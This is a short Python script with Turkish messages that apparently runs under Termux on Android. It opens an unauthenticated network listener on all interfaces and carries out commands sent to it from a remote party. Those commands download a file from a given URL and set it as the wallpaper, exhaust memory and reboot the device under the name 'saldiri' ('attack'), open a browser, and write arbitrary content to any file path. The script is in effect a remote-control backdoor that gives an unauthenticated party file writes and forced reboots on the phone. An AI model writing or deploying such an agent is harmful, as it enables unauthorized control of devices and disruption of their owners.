
import socket
import os
import urllib.request
import subprocess
import time

def get_my_ip():
    try:
        out = subprocess.check_output("ifconfig", shell=True).decode()
        for line in out.splitlines():
            if "inet " in line and "127.0.0.1" not in line:
                return line.split()[1]
    except:
        return "192.168.1.100"

def start_server(port):
    s = socket.socket()
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print(f"[+] Dinleniyor: 0.0.0.0:{port}")
    while True:
        conn, addr = s.accept()
        print(f"[✓] Komut geldi: {addr[0]}")
        try:
            komut = conn.recv(2048).decode().strip()
            if komut.startswith("arkaplan "):
                url = komut.split(" ", 1)[1]
                yol = "/sdcard/Download/bg.jpg"
                urllib.request.urlretrieve(url, yol)
                os.system(f"termux-wallpaper -f {yol}")
                conn.send("[✓] Arka plan degistirildi\n".encode())

            elif komut == "saldiri":
                for _ in range(10000000): _ = "x" * 1000
                os.system("reboot")

            elif komut == "google":
                os.system("am start -a android.intent.action.VIEW -d https://www.google.com")
                conn.send("[✓] Google acildi\n".encode())

            elif komut.startswith("dosya "):
                _, yol, icerik = komut.split(" ", 2)
                with open(yol, "w") as f:
                    f.write(icerik)
                conn.send(f"[✓] Dosya olusturuldu: {yol}\n".encode())

            else:
                conn.send("[!] Gecersiz komut\n".encode())

        except Exception as e:
            try:
                conn.send(f"[!] Hata: {str(e)}\n".encode())
            except:
                pass
        conn.close()

if __name__ == "__main__":
    my_ip = get_my_ip()
    print(f"[*] Cihaz IP: {my_ip}")
    port = int(input("Port gir: "))
    start_server(port)
